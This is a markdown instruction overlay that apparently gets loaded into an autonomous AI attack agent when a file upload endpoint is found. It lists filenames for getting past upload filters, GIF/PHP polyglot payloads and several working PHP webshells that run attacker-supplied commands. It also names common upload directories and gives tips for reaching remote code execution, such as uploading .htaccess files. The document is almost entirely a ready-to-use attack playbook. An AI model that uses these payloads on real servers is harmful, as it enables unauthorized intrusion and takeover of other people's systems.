# File Upload — Dynamic Overlay

## Metadata
- **Exploit Type**: file_upload
- **Applies To**: Gamma, MCP Agent
- **Loading**: Appended when upload endpoint detected or `exploit_type === "file_upload"`

---

## OVERLAY_CONTEXT

File upload vulnerabilities allow uploading malicious files (webshells, polyglots) that can be executed server-side. Success indicators: remote code execution, file inclusion, or denial of service.

---

## Extension Bypasses

### Null Byte Injection
```
shell.php%00.jpg
shell.php\x00.jpg
```

### Double Extension
```
shell.jpg.php
shell.php.jpg
shell.phtml
shell.php5
shell.php7
```

### Case Variation
```
shell.PhP
shell.PHP
shell.pHp
```

### MIME Type Bypass
```
# Change Content-Type header
Content-Type: image/jpeg (but file is PHP)
```

### Magic Byte Truncation
```
# JPEG magic bytes + PHP code
GIF89a; <?php system($_GET['cmd']); ?>
```

---

## Polyglot Payloads

### JPEG + PHP (Polyglot)
```
GIF89a<?php system($_GET['cmd']); ?>
```

### PNG + PHP
```
PNG (binary) + <?php system($_GET['cmd']); ?>
```

### ZIP + PHP (via Phar wrapper)
```
# Create phar archive with PHP payload
```

---

## Webshell Payloads

### Basic PHP Shell
```php
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
<?php eval($_POST['code']); ?>
```

### Minimal Shell
```php
<?=`$_GET[0]`?>
# Call: ?0=whoami
```

### Using File Functions
```php
<?php include($_GET['file']); ?>
```

---

## Upload Locations

```
/uploads/
/upload/
/images/
/files/
/avatar/
/profile/
/attachments/
/media/
```

---

## Constraints

```
- ALWAYS check if uploaded files are actually executable (check server config)
- .htaccess / web.config upload = immediate RCE
- Upload filters may check Content-Type, extension, file size, or magic bytes
- Polyglots must be valid images AND contain working PHP code
- If file inclusion exists: upload .jpg and include it via LFI overlay
```

---

*Overlay version: 1.0*
